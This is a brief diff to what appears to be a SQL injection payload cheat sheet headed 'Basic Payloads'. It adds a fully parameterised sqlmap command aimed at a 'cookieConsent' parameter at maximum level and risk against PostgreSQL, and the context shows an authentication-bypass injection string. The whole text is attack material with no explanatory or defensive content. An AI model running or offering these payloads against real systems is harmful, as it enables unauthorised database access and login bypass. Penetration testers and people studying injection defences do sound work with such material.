@@ -1,4 +1,9 @@
  Basic Payloads
+
+sqlmap -r request.txt -p cookieConsent --level 5 --risk 3 --random-agent --time-sec=10 --threads=2 --dbms=PostgreSQL
+
+
+
 Bypass Authentication:
 
 ' OR '1'='1'; --
